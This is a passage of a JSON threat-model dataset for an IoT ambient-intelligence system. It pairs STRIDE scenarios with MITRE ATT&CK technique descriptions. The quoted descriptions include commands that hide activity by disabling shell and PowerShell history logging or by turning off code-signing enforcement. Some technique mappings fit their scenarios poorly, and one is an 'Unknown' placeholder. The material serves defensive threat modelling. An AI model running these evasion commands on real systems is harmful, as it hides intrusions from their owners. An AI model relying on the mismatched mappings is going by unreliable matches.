adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with sensor data to manipulate the environment's intelligent decisions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the sensors.",
                    "Role": "Attacker",
                    "Condition": "The sensors are installed in easily accessible locations."
                },
                {
                    "Assumption": "Sensor communications are not encrypted.",
                    "Role": "System Designer",
                    "Condition": "The system does not use secure communication protocols."
                }
            ],
            "Potential Impact": "Tampered data could lead to incorrect decisions, affecting system integrity and reliability.",
            "MITRE ATT&CK Keywords": [
                "sensor tampering",
                "data manipulation",
                "network",
                "device"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could intercept and alter data in transit between sensors and data repositories.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted over insecure communication channels.",
                    "Role": "System Designer",
                    "Condition": "The system uses unencrypted communication protocols."
                },
                {
                    "Assumption": "The attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "The network is not properly secured."
                }
            ],
            "Potential Impact": "Altered data could lead to incorrect environment adaptations, compromising the integrity of the system's responses.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "data manipulation",
                "network",
                "communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with the AI/ML models to introduce biases or corrupt decision-making.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the training environment or data.",
                    "Role": "Attacker",
                    "Condition": "The training process is not secured."
                },
                {
                    "Assumption": "The system does not validate incoming training data.",
                    "Role": "System Designer",
                    "Condition": "Lack of data validation processes."
                }
            ],
            "Potential Impact": "Corrupted models could lead to harmful or unintended decisions, affecting system integrity and user trust.",
            "MITRE ATT&CK Keywords": [
                "model corruption",
                "AI tampering",
                "training data",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious user could deny having performed critical actions by exploiting flaws in the system's logging mechanisms.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks comprehensive logging of user actions.",
                    "Role": "System Designer",
                    "Condition": "Insufficient or no logging mechanisms in place."
                },
                {
                    "Assumption": "The attacker has knowledge of logging weaknesses.",
                    "Role": "Attacker",
                    "Condition": "The attacker has insider knowledge or has performed reconnaissance."
                }
            ],
            "Potential Impact": "Inability to trace malicious actions could hinder incident response and forensic investigations, affecting system integrity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log tampering",
                "forensics",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Impair Command History Logging",
                "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",
                "id": "attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59",
                "technique_id": "T1562.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user could claim unauthorized changes to the system settings, exploiting the absence of change logs.",
            "Assumptions": [
                {
                    "Assumption": "The system does not log configuration changes.",
                    "Role": "System Administrator",
                    "Condition": "Change logging is not implemented or enforced."
                },
                {
                    "Assumption": "Users have the ability to modify settings.",
                    "Role": "User",
                    "Condition": "User roles are inadequately defined."
                }
            ],
            "Potential Impact": "Lack of change tracking could lead to unaccountable changes, disrupting system integrity and operational continuity.",
            "MITRE ATT&CK Keywords": [
                "configuration management",
                "change tracking",
                "accountability",
                "audit"
            ],
            "mitre_technique": {
                "name": "Impair Command History Logging",
                "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",
                "id": "attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59",
                "technique_id": "T1562.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could use shared credentials to perform unauthorized actions and deny involvement.",
            "Assumptions": [
                {
                    "Assumption": "Multiple users share the same credentials.",
                    "Role": "User",
                    "Condition": "Credentials are not unique or individually assigned."
                },
                {
                    "Assumption": "The system does not enforce user-specific authentication.",
                    "Role": "System Designer",
                    "Condition": "Authentication relies on shared accounts."
                }
            ],
            "Potential Impact": "The system fails to attribute actions to specific users, affecting accountability and incident response.",
            "MITRE ATT&CK Keywords": [
                "shared credentials",
                "authentication",
                "non-repudiation",
                "audit"
            ],
            "mitre_technique": {
                "name": "SSH",
                "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user\u2019s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.",
                "id": "attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6",
                "technique_id": "T1021.004"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data in motion is intercepted due to unencrypted communication channels.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted over unsecured channels.",
                    "Role": "System Designer",
                    "Condition": "The system uses unencrypted communication protocols."
                },
                {
                    "Assumption": "The attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "The network is not secure."
                }
            ],
            "Potential Impact": "Interception of sensitive data could lead to breaches of data confidentiality and exposure of personal information.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "unencrypted communication",
                "network traffic",
                "data confidentiality"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could access sensitive data stored in repositories due to inadequate access controls.",
            "Assumptions": [
                {
                    "Assumption": "Access controls are weak or non-existent.",
                    "Role": "System Administrator",
                    "Condition": "The system lacks robust access control mechanisms."
                },
                {
                    "Assumption": "The attacker gains unauthorized user credentials.",
                    "Role": "Attacker",
                    "Condition": "Credential access is obtained through phishing or other methods."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data could lead to significant breaches of data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "data repositories",
                "access control",
                "data confidentiality",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive user data is leaked through unsecured IoT devices acting as entry points.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices are not properly secured.",
                    "Role": "System Designer",
                    "Condition": "The devices lack firmware updates or have default credentials."
                },
                {
                    "Assumption": "The attacker can access the network through these devices.",
                    "Role": "Attacker",
                    "Condition": "Network segmentation is weak or non-existent."
                }
            ],
            "Potential Impact": "Compromised IoT devices could lead to unauthorized data access and breaches of confidentiality.",
            "MITRE ATT&CK Keywords": [
                "IoT security",
                "device compromise",
                "network access",
                "data confidentiality"
            ],
            "mitre_technique": {
                "name": "Network Trust Dependencies",
                "description": "Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: Pentesting AD Forests) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
                "id": "attack-pattern--36aa137f-5166-41f8-b2f0-a4cfa1b4133e",
                "technique_id": "T1590.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A distributed denial-of-service (DDoS) attack floods the communication infrastructure, disrupting data flow and system operations.",
            "Assumptions": [
                {
                    "Assumption": "The communication infrastructure is not robust against high traffic volumes.",
                    "Role": "System Designer",
                    "Condition": "Lack of DDoS protection mechanisms."
                },
                {
                    "Assumption": "The attacker has the resources to launch a large-scale DDoS attack.",
                    "Role": "Attacker",
                    "Condition": "Access to botnet or similar tools."
                }
            ],
            "Potential Impact": "Service disruption could affect system availability, hindering real-time decision-making and user interactions.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "service disruption",
                "network traffic",
                "system availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could initiate a resource exhaustion attack, targeting the AI/ML components to degrade system performance.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks resource management and monitoring.",
                    "Role": "System Designer",
                    "Condition": "No mechanisms to detect and mitigate resource exhaustion."
                },
                {
                    "Assumption": "The attacker can send a large number of requests to the AI/ML components.",
                    "Role": "Attacker",
                    "Condition": "The system interfaces are exposed and unprotected."
                }
            ],
            "Potential Impact": "Resource exhaustion could severely degrade system performance, impacting availability and responsiveness.",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "system performance",
                "AI/ML",
                "system availability"
            ],
            "mitre_technique": {
                "name": "System Shutdown/Reboot",
                "description": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation: alert_TA18_106A)\n\nShutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.\n\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)",
                "id": "attack-pattern--ff73aa03-0090-4464-83ac-f89e233c02bc",
                "technique_id": "T1529"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious firmware on actuators leads to constant system state changes, disrupting normal operations.",
            "Assumptions": [
                {
                    "Assumption": "Actuator firmware can be modified without proper validation.",
                    "Role": "System Designer",
                    "Condition": "Lack of secure firmware update mechanisms."
                },
                {
                    "Assumption": "The attacker has physical or remote access to actuators.",
                    "Role": "Attacker",
                    "Condition": "Inadequate physical or network security controls."
                }
            ],
            "Potential Impact": "Service disruption and potential damage to the physical environment, affecting both availability and system integrity.",
            "MITRE ATT&CK Keywords": [
                "firmware manipulation",
                "actuator",
                "service disruption",
                "system integrity"
            ],
            "mitre_technique": {
                "name": "Code Signing Policy Modification",
                "description": "Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. \n\nSome of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.(Citation: Microsoft DSE June 2017)(Citation: Apple Disable SIP) Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.(Citation: Microsoft Unsigned Driver Apr 2017)(Citation: Apple Disable SIP)\n\nAdversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112), rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP)(Citation: FireEye HIKIT Rootkit Part 2)(Citation: GitHub Turla Driver Loader) Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP) Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.(Citation: F-Secure BlackEnergy 2014)\n\nTo gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) using a signed, but vulnerable driver.(Citation: Unit42 AcidBox June 2020)(Citation: GitHub Turla Driver Loader)",
                "id": "attack-pattern--565275d5-fcc3-4b66-b4e7-928e4cac6b8c",
                "technique_id": "T1553.006"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the communication infrastructure to gain elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "The communication infrastructure has known vulnerabilities.",
                    "Role": "System Designer",
                    "Condition": "The system is not regularly updated or patched."
                },
                {
                    "Assumption": "The attacker is aware of these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "The attacker has access to exploit information."
                }
            ],
            "Potential Impact": "Gain of elevated privileges could lead to unauthorized access, data tampering, and disruption of system functionalities.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "vulnerability exploitation",
                "network infrastructure",
                "system access"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user with legitimate access exploits a misconfiguration to gain unauthorized access to restricted functionalities.",
            "Assumptions": [
                {
                    "Assumption": "The system has poorly configured access controls.",
                    "Role": "System Administrator",
                    "Condition": "Misconfigurations exist in access control settings."
                },
                {
                    "Assumption": "The user has enough knowledge of the system to find and exploit these misconfigurations.",
                    "Role": "User",
                    "Condition": "Technical knowledge or insider information."
                }
            ],
            "Potential Impact": "Elevated privileges could lead to data breaches, unauthorized changes to system configuration, affecting integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "misconfiguration",
                "access control",
                "privilege escalation",
                "system integrity"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a hardware token assigned to another user to gain higher access privileges within the system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the hardware token.",
                    "Role": "Attacker",
                    "Condition": "The token is not securely stored or monitored."
                },
                {
                    "Assumption": "The system does not require multi-factor authentication.",
                    "Role": "System Designer",
                    "Condition": "Authentication is solely dependent on the hardware token."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive areas, leading to potential data breaches and integrity violations.",
            "MITRE ATT&CK Keywords": [
                "hardware token",
                "privilege escalation",
                "authentication",
                "system access"
            ],
            "mitre_technique": {
                "name": "Application Access Token",
                "description": "Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\n",
                "id": "attack-pattern--27960489-4e7f-461d-a62a-f5c0cb521e4a",
                "technique_id": "T1527"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "16",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user to gain access to the IoT AmI system by stealing smart card credentials.",
            "Assumptions": [
                {
                    "Assumption": "Smart cards are used for user authentication.",
                    "Role": "User",
                    "Condition": "Valid if smart card is stolen or physically duplicated."
                },
                {
                    "Assumption": "The attacker has access to the physical environment where smart cards are used.",
                    "Role": "Attacker",
                    "Condition": "Valid in environments with weak physical security."
